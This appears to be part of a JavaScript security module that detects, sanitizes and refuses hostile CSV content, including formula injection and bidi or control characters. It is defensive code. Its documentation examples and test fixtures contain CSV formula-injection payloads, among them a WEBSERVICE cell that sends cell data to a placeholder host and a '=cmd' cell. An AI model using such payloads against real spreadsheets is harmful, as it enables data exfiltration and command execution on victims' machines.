 * accept-side defense — it sanitizes, re-parses, and re-serializes
 * with the formula mitigation baked in.
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   bidiCharPolicy:    "reject"|"strip"|"audit"|"allow",
 *   controlCharPolicy: "reject"|"strip"|"allow",
 *   nullByteHandling:  "reject"|"strip"|"allow",
 *   homoglyphPolicy:   "audit"|"strip"|"allow",
 *   trailingWhitespacePolicy: "trim"|"preserve"|"reject",
 *   sanitizeAmplificationCap: number,   // default 1.5
 *
 * @example
 *   // Build hostile input programmatically so the source stays ASCII.
 *   var ZWSP = String.fromCharCode(0x200B);
 *   var clean = b.guardCsv.sanitize("name,note\r\nalice,hi" + ZWSP + "\r\n", {
 *     profile: "balanced",
 *   });
 *   clean.indexOf(ZWSP) === -1;                        // → true
 */
// sanitize is generated by defineGuard from `sanitizeTransform` (_stripIssues)
// with sanitizeSeverities:[] (strip unconditionally, never refuse on a detected
// issue) and sanitizeAmplificationCap:"sanitizeAmplificationCap" (the "sanitize
// must shrink, never grow" post-condition that throws csv.sanitize-amplified) —
// identical to the hand-written scrubber this replaced.

/**
 * @primitive  b.guardCsv.detect
 * @signature  b.guardCsv.detect(input)
 * @since      0.7.5
 * @status     stable
 * @related    b.guardCsv.validate, b.csv.parse
 *
 * Sniff dialect heuristics from `input` (string or Buffer): most-
 * frequent delimiter on the first line (`","`, `";"`, `"\t"`,
 * `"|"`), dominant line-ending, header presence (first line starts
 * with an ASCII letter), encoding hint (`"utf-8"` vs `"utf-8-sig"`
 * when a leading BOM is present), and a single-pass `dialect`
 * verdict (`"consistent"` vs `"mixed"` line endings). Returns a
 * confidence score in `[0, 1]`. Pure inspection.
 *
 * @example
 *   var d = b.guardCsv.detect("name,age\r\nalice,30\r\nbob,40\r\n");
 *   d.delimiter;                                       // → ","
 *   d.lineEnding;                                      // → "\r\n"
 *   d.hasHeader;                                       // → true
 *   d.encoding;                                        // → "utf-8"
 *   d.dialect;                                         // → "consistent"
 */
function detect(input) {
  var text = typeof input === "string"
    ? input
    : (Buffer.isBuffer(input) ? input.toString("utf8") : null);
  if (text == null) {
    return {
      delimiter: null, hasHeader: false, encoding: null,
      lineEnding: null, dialect: "unknown", confidence: 0,
    };
  }
  var crlf = (text.match(/\r\n/g) || []).length;
  var lfOnly = (text.match(/[^\r]\n/g) || []).length;
  var crOnly = (text.match(/\r[^\n]/g) || []).length;
  var lineEnding = crlf >= lfOnly && crlf >= crOnly
    ? "\r\n"
    : (lfOnly >= crOnly ? "\n" : "\r");
  var firstLine = text.split(/\r\n|\r|\n/)[0] || "";
  var counts = { ",": 0, ";": 0, "\t": 0, "|": 0 };
  for (var i = 0; i < firstLine.length; i += 1) {
    var c = firstLine.charAt(i);
    if (counts[c] !== undefined) counts[c] += 1;
  }
  var delim = ","; var max = 0;
  Object.keys(counts).forEach(function (k) {
    if (counts[k] > max) { max = counts[k]; delim = k; }
  });
  return {
    delimiter:  delim,
    hasHeader:  /^[A-Za-z]/.test(firstLine),
    encoding:   text.charCodeAt(0) === 0xFEFF ? "utf-8-sig" : "utf-8",
    lineEnding: lineEnding,
    dialect:    (crlf > 0 && (lfOnly > 0 || crOnly > 0)) ? "mixed" : "consistent",
    confidence: max > 0 ? 0.9 : 0.5,
  };
}

// ---- Gate factory (b.gateContract shape) ----

/**
 * @primitive  b.guardCsv.gate
 * @signature  b.guardCsv.gate(opts?)
 * @since      0.7.5
 * @status     stable
 * @compliance hipaa, pci-dss, gdpr, soc2
 * @related    b.guardCsv.validate, b.guardCsv.sanitize, b.staticServe.create, b.fileUpload.create
 *
 * Build a `b.gateContract` gate suitable for plugging into
 * `b.staticServe({ contentSafety: { ".csv": gate } })`,
 * `b.fileUpload({ contentSafety: { "text/csv": gate } })`,
 * `b.mail`, or `b.objectStore`. Each finding's action is the one the
 * operator's policy for that class selected: `serve` (no issues) →
 * `audit-only` (observe-only findings) → `sanitize` (a class set to a
 * mitigation — formula `prefix-tab`, bidi/control `strip` — so the gate
 * strips, then re-parses + re-serializes when a formula cell is present so
 * escapeCell's mitigation lands) → `refuse` (a class set to `reject`, the
 * dangerous-function denylist, or an ambiguous mixed dialect). `refuse`
 * wins over `sanitize` wins over `audit-only`.
 *
 * Operator extensibility: pass `operatorRules: [{ id, severity,
 * detect: fn(ctx)→boolean, reason }]` to inject custom detectors
 * alongside the built-in catalog. Rules run best-effort — a
 * throwing detector is silently skipped (the framework cannot
 * crash a request because an operator rule mishandled bytes).
 *
 * @opts
 *   profile:    "strict"|"balanced"|"permissive"|"email-attachment",
 *   compliancePosture: "hipaa"|"pci-dss"|"gdpr"|"soc2",
 *   name:       string,    // gate identity for audit / observability
 *   operatorRules: [{ id: string, severity: "warn"|"high"|"critical",
 *                    detect: function, reason: string }],
 *
 * @example
 *   var csvGate = b.guardCsv.gate({ profile: "strict" });
 *
 *   // Wire into staticServe so every served .csv runs through the gate.
 *   var serve = b.staticServe.create({
 *     root: "/var/data",
 *     contentSafety: { ".csv": csvGate },
 *   });
 *
 *   // A plain formula cell is mitigated in place (strict's formula policy is
 *   // prefix-tab — a cell beginning `=`/`+`/`-`/`@` is prefixed with a TAB so
 *   // spreadsheets render it as text rather than evaluate it):
 *   var formula = Buffer.from("name,formula\r\nalice,=cmd|x\r\n", "utf8");
 *   (await csvGate.check({ bytes: formula })).action;  // → "sanitize"
 *
 *   // A denylisted exfiltration/RCE function refuses — too dangerous to serve
 *   // even prefixed:
 *   var exfil = Buffer.from('a\r\n=WEBSERVICE("http://x/"&A1)\r\n', "utf8");
 *   (await csvGate.check({ bytes: exfil })).action;    // → "refuse"
 */
// Disposition of each csv finding = what the operator's policy for that class
// selected (reject → refuse, a mitigation like prefix-tab/strip → sanitize,
// audit → audit), resolved through gateContract.policyDisposition. The
// dangerous-function denylist and an ambiguous mixed-dialect always refuse —
// neither is safe to serve even after a best-effort mitigation; a stray BOM is
// always strippable; the zero-width / homoglyph observations are audit-only.
// Exhaustive over every kind _detectIssues can emit (the gate-disposition
// coverage test enforces it), so the gate never falls back to severity.
function _gateDispositionFor(issue, opts) {
  switch (issue.kind) {
    case "bidi-override":              return gateContract.policyDisposition(opts.bidiCharPolicy);
    case "control-char":               return gateContract.policyDisposition(opts.controlCharPolicy);
    case "null-byte":                  return gateContract.policyDisposition(opts.nullByteHandling);
    case "formula-prefix-cell":        return gateContract.policyDisposition(opts.formulaInjectionPolicy);
    case "homoglyph":                  return gateContract.policyDisposition(opts.homoglyphPolicy);
    case "bom-mid-stream":             return "sanitize";
    case "zero-width":                 return "sanitize";
    case "dangerous-function":         return "refuse";
    case "dialect-mixed-line-endings": return "refuse";
    default:                           return null;
  }
}

// Operator-injected rules run as detect-only findings. The guard owns no
// sanitizer for them, so buildContentGate treats a refusal-severity hit as
// refuse (it cannot serve a "sanitized" output that still carries the rule's
// finding). Best-effort: a throwing detector is skipped — the framework cannot
// crash a request because an operator rule mishandled bytes.
function _gateOperatorIssues(text, opts, ctx) {
  var out = [];
  if (!Array.isArray(opts.operatorRules)) return out;
  for (var i = 0; i < opts.operatorRules.length; i += 1) {
    var rule = opts.operatorRules[i];
    try {
      if (rule.detect && rule.detect({ bytes: text, ctx: ctx })) {
        // Default an operator rule that fires to refusal severity: the gate owns
        // no sanitizer for operator findings, so an unspecified-severity rule
        // BLOCKS by default (the operator wrote it to catch something) — they
        // opt DOWN to "warn" to observe-only, never silently up to serve.
        out.push({
          kind: rule.id, severity: rule.severity || "high",
          ruleId: rule.id, snippet: rule.reason || rule.id,
        });
      }
    } catch (_e) { /* operator rule best-effort */ }
  }
  return out;
}

// Gate sanitize: strip the removable findings, then — when a formula / dangerous
// cell survives the strip — reparse + reserialize so escapeCell applies the
// operator's formula mitigation (prefix-tab / wrap-with-quotes). The mitigation
// is in-place (a TAB-prefixed cell is inert in a spreadsheet but still matches
// the cell-boundary formula scan), so the gate trusts this output rather than
// re-validating it. Returns bytes.
function _gateProduceSanitized(text, opts) {
  var clean = module.exports.sanitize(text, opts);
  var hasFormula = _detectIssues(clean, opts).some(function (i) {
    return i.kind === "formula-prefix-cell" || i.kind === "dangerous-function";
  });
  if (hasFormula) {
    var rows = csv.parse(clean, { header: false });
    clean = serialize(rows, Object.assign({}, opts, { headers: false }));
  }
  return Buffer.from(clean, "utf8");
}

function gate(opts) {
  opts = module.exports.resolveOpts(opts);
  return gateContract.buildContentGate({
    name:             opts.name || "guardCsv:" + (opts.profile || "default"),
    opts:             opts,
    validate:         module.exports.validate,
    dispositionFor:   _gateDispositionFor,
    extraIssues:      _gateOperatorIssues,
    produceSanitized: _gateProduceSanitized,
  });
}

// buildProfile / compliancePosture / loadRulePack are assembled by
// gateContract.defineGuard below (makeProfileBuilder(PROFILES) /
// lookupCompliancePosture(_, COMPLIANCE_POSTURES) / makeRulePackLoader).
// Their wiki sections render from the single-sourced @abiTemplate blocks
// in gate-contract.js, instantiated per guard by the page generator.

// ---- adaptive integration-test fixtures (consumed by layer-5 host harness) ----
var INTEGRATION_FIXTURES = Object.freeze({
  kind:        "content",
  contentType: "text/csv",
  extension:   ".csv",
  benignBytes: Buffer.from("name,age\r\nalice,30\r\n", "utf8"),
  // Hostile: a cell invokes a denylisted exfiltration function (WEBSERVICE) —
  // an RCE / data-exfil vector too dangerous to serve even mitigated, so the
  // gate refuses (a plain formula prefix-cell would instead be sanitized in
  // place by the strict profile's prefix-tab policy).
  hostileBytes: Buffer.from('name,formula\r\nalice,=WEBSERVICE("http://x/"&A1)\r\n', "utf8"),
});

// Assembled from the gate-contract guard factory: error class, registry
// exports (NAME / KIND / MIME_TYPES / EXTENSIONS / INTEGRATION_FIXTURES),
// buildProfile / compliancePosture / loadRulePack wiring, plus the
// per-guard inspection surface (validate / sanitize / gate) and CSV
// extras (serialize / escapeCell / detect / schema / FORMULA_PREFIXES /
// DANGEROUS_FUNCTIONS) passed through verbatim. The bespoke `gate` carries
// CSV's sanitize-reparse-reserialize chain unchanged.
module.exports = gateContract.defineGuard({
  name:        "csv",
  kind:        "content",
  errorClass:  GuardCsvError,
  profiles:    PROFILES,
  defaults:    DEFAULTS,
  postures:    COMPLIANCE_POSTURES,
  mimeTypes:   ["text/csv"],
  extensions:  [".csv"],
  integrationFixtures: INTEGRATION_FIXTURES,
  // validate + sanitize generated from detect/sanitizeTransform. "text" input
  // contract (string/Buffer→utf8, bad-input otherwise — _detectIssues returns
  // [] on a non-string, so the contract owns the refusal). sanitizeSeverities
  // [] strips unconditionally; sanitizeAmplificationCap enforces shrink.
  inputContract:            "text",
  detect:                   _detectIssues,
  sanitizeTransform:        _stripIssues,
  sanitizeSeverities:       [],
  sanitizeAmplificationCap: "sanitizeAmplificationCap",
  gate:        gate,
  extra: {
    _gateDispositionForTest: _gateDispositionFor,
    serialize:           serialize,
    escapeCell:          escapeCell,
    detect:              detect,
    schema:              schema,
    FORMULA_PREFIXES:    FORMULA_PREFIXES,
    DANGEROUS_FUNCTIONS: DANGEROUS_FUNCTIONS,
  },
});
